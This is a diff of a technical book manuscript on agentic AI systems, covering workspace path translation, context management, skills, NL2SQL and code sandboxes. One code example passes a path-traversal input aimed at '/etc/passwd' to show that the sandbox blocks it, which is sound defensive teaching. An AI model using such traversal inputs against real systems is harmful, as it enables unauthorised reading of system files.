@@ -5270,7 +5270,7 @@ The workspace module provides functions to translate between these two views:
 
 ```python
 sandbox_path = "/workspace/reports/analysis.json"
-host_path = container_to_host_path(PurePosixPath(sandbox_path), ctx)
+host_path = workspace_to_host_path(PurePosixPath(sandbox_path), ctx)
 
 print(f"Agent sees:    {sandbox_path}")
 print(f"Actual file:   {host_path}")
@@ -5356,8 +5356,8 @@ bob_ctx = {"user_id": "bob", "session_id": "session_001"}
 
 write_to_workspace("/workspace/secret.txt", "Bob's private data", bob_ctx)
 
-bob_path = container_to_host_path(PurePosixPath("/workspace/secret.txt"), bob_ctx)
-alice_path = container_to_host_path(PurePosixPath("/workspace/secret.txt"), ctx)
+bob_path = workspace_to_host_path(PurePosixPath("/workspace/secret.txt"), bob_ctx)
+alice_path = workspace_to_host_path(PurePosixPath("/workspace/secret.txt"), ctx)
 
 print(f"Bob's file:   {bob_path}")
 print(f"Alice's file: {alice_path}")
@@ -5371,7 +5371,7 @@ The workspace enforces security boundaries through path validation. Attempts to 
 
 ```python
 try:
-    container_to_host_path(PurePosixPath("/workspace/../../../etc/passwd"), ctx)
+    workspace_to_host_path(PurePosixPath("/workspace/../../../etc/passwd"), ctx)
 except WorkspaceError as e:
     print(f"Blocked: {e}")
 ```
@@ -7438,6 +7438,11 @@ The techniques demonstrated here correspond to concepts from the chapter section
 \newpage
 
 # Chapter: Context & Memory
+
+## Introduction
+
+The management of context in agentic systems began with "prompt engineering," a term that originally described the craft of writing effective instructions for language models. Early practitioners discovered that small changes in phrasing, example selection, and information ordering could dramatically affect model outputs. What started as informal experimentation with prompts evolved into a systematic discipline as context windows expanded and agents became more capable. Today, context management encompasses not just prompt design but also memory architectures, history compaction, token budgeting, and the orchestration of information flow across multi-turn interactions. This chapter traces that evolution and presents practical techniques for engineering context in production agentic systems.
+
 
 ## Historical Perspective
 
@@ -10126,1034 +10131,211 @@ Tools bridge local agents and remote A2A agents. The `route` tool wraps A2A clie
 
 \newpage
 
-# Chapter: Skills
-
-## Skills
-
-Skills are structured, reusable capability abstractions that encapsulate complex behavior behind a minimal, declarative interface, revealing detail only when it is needed.
-
-### Historical perspective
-
-The intellectual roots of skills predate large language models. Classical AI planning introduced hierarchical task decomposition, where high-level goals were achieved by invoking abstract operators that expanded into concrete actions only during execution. In parallel, software engineering converged on similar ideas through procedures, modules, and APIs, all designed to hide implementation details behind stable contracts.
-
-With the emergence of LLM-based agents, these ideas resurfaced in a new form. Early systems relied heavily on long prompts and explicit step-by-step instructions, but this quickly proved brittle and expensive in terms of tokens. As tool use and function calling became common, practitioners observed that exposing *all* tools and instructions at once degraded model performance. Skills emerged as a response: a way to combine abstraction, modularity, and context efficiency into a single concept, tailored specifically to the constraints of probabilistic language models.
-
-### Core concept
-
-A skill defines **what a capability does**, **when it should be used**, and **what inputs and outputs are expected**, while deliberately omitting *how* it is implemented. The internal mechanics—scripts, heuristics, sub-tools, or even sub-agents—are hidden unless the agent explicitly needs them.
-
-This separation has three immediate benefits. First, it reduces cognitive and token load on the model, improving reliability. Second, it creates reusable building blocks that can be shared across agents and systems. Third, it establishes clear reasoning boundaries: the model reasons about *selecting* and *composing* skills, not about low-level execution details.
-
-### Progressive disclosure and context efficiency
-
-Progressive disclosure is the defining design principle behind skills. Instead of loading all instructions and references into the model context upfront, information is revealed incrementally.
-
-At discovery time, the agent may only see a skill’s name and short description. When the skill is selected, its main instructions are loaded. Only if the agent needs deeper guidance—edge cases, background knowledge, or operational details—are additional reference files consulted. This staged reveal is essential even for models with large context windows: performance degrades long before hard limits are reached.
-
-In practice, progressive disclosure is not an optimization; it is a prerequisite for scalable agent systems.
-
-### A spec-aligned skill example
-
-The AgentSkills specification formalizes skills as directories with a required `SKILL.md` file written in Markdown, optionally accompanied by scripts and reference material. The Markdown file serves as the primary interface between the agent and the skill.
-
-A minimal, spec-aligned skill layout looks like this:
-
-```
-pdf-processing/
-  SKILL.md
-  scripts/
-    extract.py
-  references/
-    REFERENCE.md
-```
-
-The `SKILL.md` file combines structured metadata with natural-language instructions:
-
-```md
----
-name: pdf-processing
-description: Extract text and tables from PDF files.
----
-
-# PDF Processing
-
-## When to use this skill
-Use this skill when the task involves reading, extracting, or transforming content from PDF documents.
-
-## How to use
-For standard extraction, run the bundled script:
-`scripts/extract_text_and_tables.py <file.pdf>`
-
-## Output
-Return extracted text with page numbers and any detected tables in a structured format.
-
-## Notes
-If you encounter scanned PDFs or complex layouts, consult the reference file.
-```
-
-Several important ideas are illustrated here. The YAML frontmatter provides machine-readable metadata for discovery and policy enforcement. The Markdown body provides human-readable guidance for the agent. Crucially, implementation details are *not* embedded inline; they are delegated to scripts and references that are only loaded if needed.
-
-A corresponding script might look like this (simplified for illustration):
-
-```python
-def extract(pdf_path: str) -> dict:
-    # Implementation details live here, not in the prompt
-    return {"text": [], "tables": []}
-```
-
-The agent never needs to reason about how extraction works unless explicitly instructed to inspect or modify the implementation.
-
-### Skills versus tools and prompts
-
-A tool is typically a thin wrapper around an external operation. A prompt is static text. A skill is neither. It is a *capability contract* that may orchestrate tools, enforce invariants, and embed domain knowledge, while remaining opaque by default.
-
-From the agent’s perspective, invoking a skill is an act of intent: *“I want this outcome.”* The skill handles execution. This division allows planning and execution to scale independently.
-
-### Skills as reasoning boundaries
-
-Beyond modularity, skills act as constraints on agent reasoning. By limiting the exposed surface area of capabilities, designers reduce misuse, prompt injection risks, and accidental complexity. Planning becomes a matter of selecting and sequencing skills rather than inventing procedures on the fly, making agent behavior more interpretable and auditable.
-
-As agent systems grow, skills increasingly define the action vocabulary of the agent.
-
-
-
-## Skills Specification
-
-The Agent Skills specification defines a minimal, filesystem-based format for packaging agent capabilities. A skill is a directory with a required `SKILL.md` file and optional supporting directories. The format is deliberately simple: YAML frontmatter for machine-readable metadata, Markdown body for agent instructions, and conventional directories for scripts and references.
-
-### Directory structure
-
-A skill is a directory containing at minimum a `SKILL.md` file:
-
-```
-skill-name/
-  SKILL.md
-```
-
-The directory name must match the `name` field in the frontmatter. Optional subdirectories extend the skill's capabilities:
-
-```
-skill-name/
-  SKILL.md
-  scripts/
-    extract.py
-    validate.sh
-  references/
-    REFERENCE.md
-    api-docs.md
-  assets/
-    template.json
-    schema.yaml
-```
-
-The `scripts/` directory contains executable code. The `references/` directory contains additional documentation loaded on demand. The `assets/` directory holds static resources like templates and schemas. This separation supports progressive disclosure: the agent loads each tier only when needed.
-
-### SKILL.md format
-
-The `SKILL.md` file combines structured metadata with natural-language instructions. It must begin with YAML frontmatter delimited by `---` markers, followed by Markdown content.
-
-#### Required frontmatter fields
-
-Two fields are mandatory:
-
-```yaml
----
-name: pdf-processing
-description: Extract text and tables from PDF files, fill forms, merge documents.
----
-```
-
-The `name` field identifies the skill. It must be 1-64 lowercase characters, using only letters, numbers, and hyphens. It cannot start or end with a hyphen, cannot contain consecutive hyphens, and must match the parent directory name.
-
-The `description` field explains what the skill does and when to use it. It must be 1-1024 characters. A good description includes specific keywords that help agents identify relevant tasks:
-
-```yaml
-description: Extracts text and tables from PDF files, fills PDF forms, and merges multiple PDFs. Use when working with PDF documents or when the user mentions PDFs, forms, or document extraction.
-```
-
-A poor description like "Helps with PDFs" provides insufficient signal for skill selection.
-
-#### Optional frontmatter fields
-
-Several optional fields support additional use cases:
-
-```yaml
----
-name: pdf-processing
-description: Extract text and tables from PDF files, fill forms, merge documents.
-license: Apache-2.0
-compatibility: Requires PyMuPDF library and network access for cloud storage.
-metadata:
-  author: example-org
-  version: "1.0"
-allowed-tools: Bash(python:*) Read
----
-```
-
-The `license` field specifies licensing terms, either as a license name or reference to a bundled file.
-
-The `compatibility` field (max 500 characters) indicates environment requirements: intended products, system packages, network access needs. Most skills do not need this field.
-
-The `metadata` field is an arbitrary key-value map for properties not defined by the specification. Implementations can use this for versioning, authorship, or custom attributes.
-
-The `allowed-tools` field is a space-delimited list of pre-approved tools the skill may use. This field is experimental and support varies between agent implementations.
-
-#### Body content
-
-The Markdown body after the frontmatter contains the skill instructions. There are no format restrictions. The content should help agents perform the task effectively.
-
-Recommended sections include step-by-step instructions, examples of inputs and outputs, and common edge cases. The agent loads the entire body when it activates the skill, so keep the main `SKILL.md` under 500 lines and move detailed reference material to separate files.
-
-A typical body structure:
-
-```markdown
-# PDF Processing
-
-## When to use this skill
-
-Use this skill when the task involves reading, extracting, or transforming content from PDF documents.
-
-## How to use
-
-For standard extraction, run the bundled script:
-
-python scripts/extract.py <file.pdf>
-
-## Output
-
-Return extracted text with page numbers and any detected tables in a structured format.
-
-## Notes
-
-If you encounter scanned PDFs or complex layouts, consult the reference file.
-```
-
-### Progressive disclosure tiers
-
-The specification formalizes the three disclosure tiers introduced earlier:
-
-1. **Metadata** (~100 tokens): The `name` and `description` fields, loaded at startup for all skills.
-
-2. **Instructions** (<5000 tokens recommended): The full `SKILL.md` body, loaded when the skill is activated.
-
-3. **Resources** (as needed): Files in `scripts/`, `references/`, and `assets/`, loaded only when explicitly required by the agent.
-
-### File references
-
-When referencing other files in a skill, use relative paths from the skill root:
-
-```markdown
-See [the reference guide](references/guide.md) for details.
-
-Run the extraction script:
-scripts/extract.py
-```
-
-Keep file references one level deep from `SKILL.md`. Deeply nested reference chains make skills harder to understand and maintain.
-
-### Scripts directory
-
-The `scripts/` directory contains executable code that agents can run. Scripts should be self-contained or clearly document dependencies, include helpful error messages, and handle edge cases gracefully.
-
-Supported languages depend on the agent implementation. Common options include Python, Bash, and JavaScript. The specification does not prescribe execution details; these are left to the runtime.
-
-### References directory
-
-The `references/` directory contains additional documentation that agents can read when needed. Common patterns include:
-
-- `REFERENCE.md` for detailed technical reference
-- Domain-specific files like `security-checklist.md` or `api-docs.md`
-- Form templates or structured data formats
-
-Keep individual reference files focused. Agents load these on demand, so smaller files mean more efficient use of context.
-
-### Assets directory
-
-The `assets/` directory contains static resources: document templates, configuration templates, images, diagrams, lookup tables, and schemas. These files are read-only resources that support skill execution without being instructions themselves.
-
-### Validation
-
-The specification includes naming and format constraints that can be validated programmatically. The `name` field must follow strict conventions: lowercase alphanumeric with hyphens, no leading or trailing hyphens, no consecutive hyphens, and matching the directory name. The `description` field must be non-empty and within length limits.
-
-Agent implementations should validate skills at discovery time and reject malformed entries rather than failing at activation.
-
-
-## Engineering
-
-We discuss making skills discoverable, cheap to advertise to a model, and safe to activate and execute inside a broader agent system.
-
-### What “engineering skills” actually means
-
-The Agent Skills integration guide is explicit about what a skills-compatible runtime must do: it discovers skill directories, loads only metadata at startup, matches tasks to skills, activates a selected skill by loading full instructions, and then executes scripts and accesses bundled resources as needed. [3] The important architectural point is that integration is designed around progressive disclosure: startup and routing should rely on frontmatter only, while "activation" is the moment you pay to load instructions and any additional files. [3]
-
-The specification formalizes the artifact you are integrating. A skill is a directory with a required `SKILL.md` file and optional `scripts/`, `references/`, and `assets/` directories. [2] The `SKILL.md` file begins with YAML frontmatter that must include `name` and `description`, and may include fields such as `compatibility`, `metadata`, and an experimental `allowed-tools` allowlist. [2] The body is arbitrary Markdown instructions, and the spec notes that the agent loads the whole body only after it has decided to activate the skill. [2]
-
-A minimal discovery and metadata loader therefore looks like:
-
-```python
-def discover_skills(skill_roots: list[str]) -> list[dict]:
-    skills = []
-    for root in skill_roots:
-        for skill_dir in list_directories(root):
-            if exists(f"{skill_dir}/SKILL.md"):
-                fm = extract_yaml_frontmatter(read_file(f"{skill_dir}/SKILL.md"))
-                skills.append(
-                    {"name": fm["name"], "description": fm["description"], "path": skill_dir}
-                )
-    return skills
-```
-
-This is not an implementation detail; it is the core performance/safety contract. The integration guide recommends parsing only the frontmatter at startup "to keep initial context usage low." [3] The specification quantifies the intended disclosure tiers: metadata (name/description) is loaded for all skills, full instructions are loaded on activation, and resources are loaded only when required. [2]
-
-### Filesystem-based integration vs tool-based integration
-
-The Agent Skills guide describes two integration approaches.
-
-In a filesystem-based agent, the model operates in a computer-like environment (bash/unix). A skill is "activated" when the model reads `SKILL.md` directly (the guide's example uses a shell `cat` of the file), and bundled resources are accessed through normal file operations. [3] This approach is "the most capable option" precisely because it does not require you to pre-invent an API for every way the skill might need to read or run something; the skill can ship scripts and references and the runtime can expose them as files.
-
-In a tool-based agent, there is no dedicated computer environment, so the developer implements explicit tools that let the model list skills, fetch `SKILL.md`, and retrieve bundled assets. [3] The guide deliberately does not prescribe the exact tool design ("the specific tool implementation is up to the developer"), which is a reminder not to conflate the skill format with a particular invocation API. [3]
-
-### Injecting skill metadata into the model context
-
-The guide says to include skill metadata in the system prompt so the model knows what skills exist, and to "follow your platform's guidance" for how system prompts are updated. [3] It then provides a single example: for Claude models, it shows an XML wrapper format. [3] That example is platform-specific and should not be treated as a general recommendation for other runtimes.
-
-The general requirement is simpler: at runtime start (or on refresh), you provide a compact catalog containing at least `name`, `description`, and a way to locate the skill so the runtime can load `SKILL.md` when selected. The integration guide's own pseudocode returns `{ name, description, path }`, which is the essential structure. [3] A neutral, implementation-agnostic representation could be expressed as JSON (or any equivalent internal structure) without implying any particular prompt markup language:
-
-```json
-{
-  "available_skills": [
-    {
-      "name": "pdf-processing",
-      "description": "Extract text and tables from PDF files, fill forms, merge documents.",
-      "path": "/skills/pdf-processing"
-    }
-  ]
-}
-```
-
-The skill system works because selection can be done from the metadata alone; the body is only loaded when the orchestrator commits to activation. [3]
-
-### Security boundaries during activation
-
-Skill integration changes the risk profile the moment `scripts/` are involved. The specification defines `scripts/` as executable code that agents can run, and explicitly notes that supported languages and execution details depend on the agent implementation. [2] The frontmatter's experimental `allowed-tools` field exists to help some runtimes enforce "pre-approved tools" a skill may use, but support may vary. [2]
-
-For integration, the key design is to treat activation and execution as a controlled transition. Discovery and metadata loading are read-only operations over a directory tree; activation is when the model receives instructions that may request tool use or script execution; execution is when side effects happen. Mapping that to your agent runtime typically means (a) restricting what the model can do before activation, (b) enforcing tool/script policies during execution, and (c) logging what happened in a way that can be audited later. The Skill spec's progressive disclosure guidance is as much about control and review as it is about context budget. [2]
-
-### How skills relate to MCP
-
-MCP defines a client/server protocol where servers expose primitives, and "tools" are one of those primitives: executable functions that an AI application can invoke, alongside resources and prompts. [8] In MCP terms, tools are meant to be small, schema'd capabilities: file operations, API calls, database queries, and similar discrete actions. [8]
-
-A skill is not a competing notion of a tool. It is a packaging format for instructions plus optional scripts and references that can orchestrate one or more tools. The clean modularization pattern is to keep MCP tools narrow and reusable, and compose them inside skills where the domain workflow lives. The skill remains stable as an interface and knowledge bundle, while the underlying tool calls are the mechanical substrate that can be reused across many skills.
-
-A concrete way to express that separation is to have a skill instruct the agent to use a database-query tool and then post-process results, without embedding database details into the tool itself:
-
-```markdown
-# In SKILL.md body (instructions)
-
-When you need cohort statistics:
-1) Use the database query tool to fetch rows for the cohort definition.
-2) Compute summary metrics.
-3) If a chart is requested, call the charting tool with the computed series.
-```
-
-The reuse comes from the fact that the database-query MCP tool stays the same whether it is used by “cohort-analysis”, “data-quality-check”, or “report-generator” skills.
-
-### How skills relate to A2A
-
-The A2A protocol is positioned as an application-level protocol for agents to discover each other, negotiate interactions, manage tasks, and exchange conversational context and complex data as peers. [5] The A2A documentation frames MCP as the domain of "tools and resources" (primitives with structured inputs/outputs, often stateless) and A2A as the domain of "agents" (autonomous systems that reason, plan, maintain state, and conduct multi-turn interaction). [5]
-
-Skills align with this split. A skill is a capability package that is typically invoked "tool-like" from the outside: it has a clear name/description for routing, and activation loads instructions that define how to perform the task. [2] Internally, a skill may run a complex workflow and call many tools, but the integration surface is a capability boundary. In an A2A deployment, that boundary can be hosted by a remote agent instead of a local runtime.
-
-The A2A text even notes that an A2A server could expose some of its skills as MCP-compatible resources when they are well-defined and can be invoked in a more tool-like manner, while emphasizing that A2A's strength is more flexible, stateful collaboration beyond typical tool invocation. [5] This gives a practical integration rule: use skills (and MCP) for capability invocation; use A2A when you need delegation to a peer that will plan, negotiate, and collaborate over time.
-
-### Converting an A2A agent into a skill, and a skill into an A2A agent
-
-A safe way to talk about “conversion” without inventing protocol features is to describe what must remain invariant and what changes.
-
-What should remain invariant is the capability contract: the thing you want to be able to select by name/description, activate with full instructions, and produce outputs from. In skill terms, that contract is represented by `SKILL.md` frontmatter plus its instruction body and any referenced files. [2] In A2A terms, the contract is represented by whatever the remote agent advertises and accepts as task input, together with the task lifecycle semantics A2A provides. [5]
-
-Converting an A2A agent into a skill is therefore a packaging move: you take one externally meaningful capability that the agent provides and express it as a skill directory whose `SKILL.md` contains the instructions that the agent previously embodied in code and prompts. The integration consequences are that (a) any long-lived statefulness must be made explicit in inputs or moved up into the orchestrator, and (b) any external dependencies must be declared via `compatibility` and/or enforced via execution policy. [2]
-
-Converting a skill into an A2A agent is a hosting move: you take the skill as the unit of work and put it behind an A2A server that offers it to other agents. The skill still remains the internal playbook and resource bundle, while A2A provides the network-level concerns: discovery, negotiation, task lifecycle, and exchange of context/results. [5]
-
-The important point is that "conversion" is rarely a literal mechanical transform. It is an architectural refactoring where the skill remains the portable capability artifact, and A2A is the transport and collaboration wrapper when that capability needs to be offered across trust boundaries or organizational boundaries.
-
-
-## Hands-On: Skills and Progressive Disclosure
-
-This hands-on explores skills through `example_skills.ipynb`, demonstrating how an agent discovers available skills, activates one based on the task, and uses its tools.
-
-## Skill Structure
-
-A skill is a directory containing a `SKILL.md` file with YAML frontmatter and markdown body:
-
-```
-code-review/
-  SKILL.md
-  references/
-    REFERENCE.md
-```
-
-The frontmatter provides machine-readable metadata:
-
-```yaml
----
-name: code-review
-description: Review code for quality, bugs, and security issues.
-compatibility: Works with Python, JavaScript, and TypeScript files.
----
-```
-
-The body contains instructions the agent follows when the skill is activated. This separation is the foundation of progressive disclosure: frontmatter is cheap to load for all skills, while the body is loaded only on demand.
-
-## Discovery: The Cheap Operation
-
-The `SkillRegistry` scans skill directories and extracts only frontmatter:
-
-```python
-skills_root = Path("skills-demo")
-registry = SkillRegistry()
-registry.discover([skills_root])
-```
-
-After discovery, the registry holds metadata for all skills but has not loaded any instruction bodies. This is the first tier of progressive disclosure. The agent can see what capabilities exist without paying the token cost for instructions it may never use.
-
-The `list_available_skills` function formats this metadata for injection into a system prompt:
-
-```python
-skill_catalog = list_available_skills(registry)
-```
-
-This produces a compact one-liner per skill, suitable for the agent's initial context.
-
-## Activation: The Expensive Operation
-
-When the agent needs a skill, it calls `activate_skill`:
-
-```python
-def activate_skill(skill_name: str) -> str:
-    instructions = get_skill_instructions(registry, skill_name)
-    if instructions is None:
-        return f"Skill '{skill_name}' not found."
-    activated_skills.add(skill_name)
-    print(f"[SKILL ACTIVATED: {skill_name}]")
-    return instructions
-```
-
-This loads the full `SKILL.md` body and returns it to the agent. The `[SKILL ACTIVATED]` marker makes this transition visible in the output. Activation is the second tier: the agent now has detailed instructions for this specific capability.
-
-## Gated Tools
-
-Skills can provide tools that only work after activation. In the example, `analyze_code` checks whether the code-review skill is active:
-
-```python
-def analyze_code(code: str) -> str:
-    if "code-review" not in activated_skills:
-        return "Error: You must activate the 'code-review' skill first."
-    print(f"[SKILL TOOL CALLED: analyze_code]")
-    # ... analysis logic
-```
-
-This gating enforces the progressive disclosure pattern at runtime. The agent cannot skip activation and jump directly to using tools. The `[SKILL TOOL CALLED]` marker shows when the skill's capability is actually exercised.
-
-## The Agent Flow
-
-The system prompt tells the agent about skills and how to use them:
-
-```python
-system_prompt = f"""You are an assistant with access to skills.
-
-Available skills:
-{skill_catalog}
-
-To use a skill:
-1. Call activate_skill(skill_name) to load its instructions
-2. Read the instructions to understand what tools are available
-3. Use the skill's tools (e.g., analyze_code for code-review)
-
-You must activate a skill before using its tools."""
-```
-
-When the agent receives a code review task, it recognizes the match with the code-review skill, activates it to get instructions, then uses `analyze_code` to perform the actual analysis. The output shows this sequence clearly through the activation and tool call markers.
-
-## Key Takeaways
-
-Gating tools behind activation enforces the progressive disclosure pattern at runtime and makes skill usage visible in the execution trace. The `[SKILL ACTIVATED]` and `[SKILL TOOL CALLED]` markers demonstrate the clear boundary between discovery, activation, and execution.
-
-
-## References
-
-1. AgentSkills Initiative. *What Are Skills?* AgentSkills.io, 2024. https://agentskills.io/what-are-skills
-2. AgentSkills Working Group. *Skill Specification*. AgentSkills.io, 2024. https://agentskills.io/specification
-3. AgentSkills Working Group. *Integrate skills into your agent*. AgentSkills.io, 2024. https://agentskills.io/integrate-skills
-4. Anthropic. *Claude Skills Documentation*. Anthropic, 2024. https://code.claude.com/docs/en/skills
-5. A2A Protocol Authors. *A2A and MCP*. A2A Protocol, 2025. https://a2a-protocol.org/latest/topics/a2a-and-mcp/
-6. Model Context Protocol Authors. *Architecture*. Model Context Protocol, 2025. https://modelcontextprotocol.io/docs/learn/architecture
-7. Model Context Protocol Authors. *Architecture (Specification 2025-06-18)*. Model Context Protocol, 2025. https://modelcontextprotocol.io/specification/2025-06-18/architecture
-8. Model Context Protocol Authors. *Tools*. Model Context Protocol, 2025. https://modelcontextprotocol.io/docs/concepts/tools
-
-\newpage
-
-# Chapter: Connectors
-
-This chapter covers patterns for connecting agents to external data sources and systems.
-
-## NL2SQL (Natural Language to SQL)
-
-NL2SQL is the execution pattern in which an agent translates a natural language question into a validated, read-only SQL query, executes it safely, and returns results in a form suitable for both human inspection and downstream processing.
-
-### Historical perspective
-
-Research on translating natural language into database queries predates modern language models by several decades. Early systems in the 1970s and 1980s, such as LUNAR and CHAT-80, relied on hand-crafted rules and domain-specific grammars. These approaches demonstrated the feasibility of natural language interfaces to databases but were expensive to build and brittle outside narrowly defined schemas.
-
-From the late 2000s onward, statistical and neural semantic parsing reframed NL2SQL as a supervised learning problem: mapping text directly to formal query representations. Public datasets such as GeoQuery and WikiSQL enabled broader experimentation, while encoder–decoder architectures improved generalization across schemas. The recent emergence of large language models shifted the emphasis again. Instead of training a specialized parser per database, modern systems condition a general-purpose model with rich schema context, examples, and execution constraints. As a result, NL2SQL has become a practical and reliable execution mode in production agentic systems, provided it is embedded in a defensively designed pipeline.
-
-### The NL2SQL execution pattern
-
-NL2SQL should be understood as a controlled execution pipeline rather than a simple text-to-SQL transformation. The database is a high-impact tool, and the schema is the primary grounding mechanism that constrains the model’s reasoning.
-
-A typical workflow begins with a natural language question. Before any SQL is generated, the agent is provided with a complete, annotated schema describing tables, columns, relationships, and conventions. Using this context, the agent proposes a SQL query. That query is then passed through explicit validation steps that enforce security and correctness constraints, such as read-only access and single-statement execution. Only validated queries are executed, and results are returned in a bounded form.
-
-This separation between reasoning, validation, and execution is what makes NL2SQL robust enough for real-world use.
-
-### Schema as first-class context
-
-One of the most important lessons from production NL2SQL systems is that schema preparation belongs offline. Instead of querying database catalogs dynamically at runtime, schemas are extracted once, enriched, and cached as structured metadata. This cached schema becomes the authoritative reference for all NL2SQL reasoning.
-
-A “good” schema for agents is not minimal. It is intentionally verbose and explanatory, especially around ambiguous or overloaded fields. Confusing column names are clarified in comments, enum-like fields explicitly list their allowed values, and small samples of real data illustrate typical usage.
-
-A representative schema fragment might look like this:
-
-```sql
--- Table: orders
--- Purpose: Customer purchase orders in the e-commerce system
-
-CREATE TABLE orders (
-    order_id INTEGER PRIMARY KEY,
-        -- Unique identifier for each order
-
-    status VARCHAR(20),
-        -- Current lifecycle state of the order
-        -- Allowed values (controlled vocabulary):
-        --   pending    : order placed, not yet processed
-        --   shipped    : order shipped to customer
-        --   cancelled  : order cancelled before shipment
-
-    channel VARCHAR(20),
-        -- Sales channel through which the order was placed
-        -- Allowed values:
-        --   web, mobile_app, phone_support
-
-    total_amount DECIMAL(10,2),
-        -- Total order value in USD, including taxes
-
-    created_at TIMESTAMP,
-        -- Order creation timestamp in UTC
-
-    customer_id INTEGER
-        -- References customers.customer_id
-);
-
--- Sample data (illustrative):
--- order_id , status   , channel     , total_amount
--- 10231    , shipped  , web         , 149.99
--- 10232    , pending  , mobile_app  ,  29.50
-```
-
-This level of annotation significantly reduces ambiguity for the agent. It also discourages the model from inventing values that do not exist in the database, a common failure mode when schemas are underspecified.
-
-### Controlled vocabularies and query reliability
-
-Well-designed NL2SQL schemas emphasize controlled vocabularies. Fields such as status codes, categories, types, or channels should be treated as explicit enums, even if the underlying database does not enforce them strictly.
-
-From an agent’s perspective, controlled vocabularies serve two purposes. First, they constrain generation: when the model knows that `status` can only be one of a small, named set, it is far less likely to hallucinate invalid filter conditions. Second, they improve semantic alignment between user language and database values. Natural language phrases like “open orders” or “completed orders” can be reliably mapped to documented enum values rather than guessed strings.
-
-Embedding enum values directly in schema comments, along with short explanations, makes this mapping explicit. In practice, this often matters more than formal database constraints, because the agent reasons over the schema text rather than the physical DDL alone.
-
-### Query generation and validation
-
-Even with a high-quality schema, generated SQL must be treated as untrusted input. NL2SQL systems therefore apply multiple validation layers before execution.
-
-At a minimum, only read-only queries are permitted, and multiple statements are rejected, but this is a dangerous becaus harmfull code may still be possible. A simple syntactic validation step can catch common violations:
-
-```python
-query = query.strip()
-
-# WARNING: This is just a quick validation step, ALWAYS rely on DB permissions for security
-if not query.upper().startswith("SELECT"):
-    raise ValueError("Only SELECT queries are allowed")
-
-if query.rstrip(";").count(";") > 0:
-    raise ValueError("Multiple SQL statements are not allowed")
-```
-
-Much more effective is to have "READ-ONLY" database users that are restricted by permissions at the database level. This way, even if the agent generates a malicious query, it cannot perform harmful operations.
-
-Beyond syntactic checks, execution safeguards are typically applied. Query timeouts prevent expensive scans from monopolizing database resources, and explicit limits on result size protect both the database and the agent’s context window.
-
-### Result handling and the workspace
-
-Large result sets should not be injected directly into the agent context. Instead, results are written to files in a shared workspace, and only a small preview is returned.
-
-```python
-df.to_csv("workspace/results/orders_summary.csv")
-
-preview = df.head(10)
-```
-
-The agent can then summarize the findings, show a few representative rows, and provide the file path for full inspection. This pattern keeps prompts small while preserving complete, reusable data for humans or downstream tools.
-
-### Security and access control
-
-Production NL2SQL systems operate under strict security constraints. Database access is typically read-only, and credentials are managed externally through a secrets manager. Queries are executed on behalf of users without exposing raw credentials to the agent.
-
-This design supports auditing, user-specific permissions, and credential rotation without modifying agent logic. The agent interacts with the database only through a constrained execution interface.
-
-### Architectural considerations
-
-Successful NL2SQL systems usually adopt a layered architecture. Database-specific logic is isolated behind abstract interfaces, while business logic operates on standardized result types. This separation allows the same NL2SQL agent to work across multiple databases with minimal changes.
-
-Equally important is minimizing runtime complexity. Schema extraction, annotation, enum detection, and example query generation are expensive operations that belong in offline pipelines. At runtime, the agent should rely entirely on cached metadata and focus on reasoning, validation, and execution.
-
-### References
-
-1. Woods, W. A. *Progress in Natural Language Understanding: An Application to Lunar Geology*. AFIPS Conference Proceedings, 1973.
-2. Zelle, J., Mooney, R. *Learning to Parse Database Queries Using Inductive Logic Programming*. AAAI, 1996.
-3. Zhong, V., et al. *Seq2SQL: Generating Structured Queries from Natural Language using Reinforcement Learning*. arXiv, 2017.
-4. Yu, T., et al. *Spider: A Large-Scale Human-Labeled Dataset for Complex and Cross-Domain Semantic Parsing and Text-to-SQL Task*. EMNLP, 2018.
-
-
-\newpage
-
 # Chapter: Execution Infrastructure
 
-This chapter covers the production infrastructure for running agent-generated code safely: containerized sandboxes, stateful REPL environments, and approval workflows for autonomous execution.
+## Code Sandbox
 
-## MCP Sandbox Overview
+When agents use the CodeAct pattern -- generating and executing arbitrary code to accomplish tasks -- they need an execution environment that is isolated, recoverable, and auditable. A sandbox provides this environment. It sits between the agent and the host operating system, enforcing boundaries that the agent's code cannot circumvent.
 
-MCP Sandbox is an implementation of CodeAct. Itprovides secure, isolated execution environments for running arbitrary code through Docker containers. The system manages concurrent multi-tenant sessions, each with dedicated containers and filesystems, while ensuring resource isolation, failure recovery, and operational observability.
+This section describes the concepts and mechanisms behind sandboxed execution. The sandbox is a library-level abstraction: it provides the building blocks that higher-level systems (MCP servers, API services, CLI tools) compose into complete execution environments.
 
-## Core Architecture
+## Why Agents Need Sandboxes
 
-### Multi-Tenant Session Model
+Tool-based agents operate within a controlled vocabulary: each tool has defined inputs, outputs, and permissions (see the `@tool_permission` decorator in our tools module). But CodeAct agents write and run arbitrary code. A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate.
 
-The architecture implements strict session isolation where each user session operates in a dedicated container with its own filesystem. Sessions are identified by a composite key (`user_id:session_id`), enabling multiple concurrent sessions per user while maintaining complete isolation.
+The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
 
-**Key Design Decisions**:
-- Composite session keys provide natural multi-tenancy without complex access control
-- One-to-one mapping between sessions and containers simplifies lifecycle management
-- Session state machines (CREATING → RUNNING → STOPPED/ERROR) enable predictable state transitions
-- Activity tracking with configurable timeouts enables automatic resource reclamation
+## Process Isolation
 
-**Trade-offs**:
-- Each session requires a full container (higher resource usage vs. simpler isolation)
-- Container startup latency on first request (mitigated by lazy creation pattern)
-- Resource overhead acceptable for strong isolation guarantees
+The fundamental mechanism is process isolation: executing the agent's code in a separate process with restricted access to the host system.
 
-### Data Isolation Through Filesystem Namespacing
+### Lightweight Isolation: Bubblewrap
 
-Each session's data resides in a host directory mounted into the container at a fixed path. This design provides filesystem isolation while enabling data persistence across container lifecycles.
+On Linux, [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) provides user-namespace-based isolation without requiring root privileges or a container runtime. It creates a minimal filesystem view by selectively bind-mounting only the paths the child process needs:
 
-**Directory Hierarchy**:
-```
-{base_data_dir}/
-  `-- {user_id}/
-      `-- {session_id}/
-          `-- [session data]
-```
-
-**Benefits**:
-- Physical isolation at filesystem level prevents cross-session access
-- Data persists when containers are recreated after failures
-- Path translation layer (`to_host_path`/`to_container_path`) abstracts storage details
-- Supports both bind mounts (local development) and named volumes (production)
-
-**Path Translation Pattern**:
-- Container paths are fixed (`/workspace`) for consistency
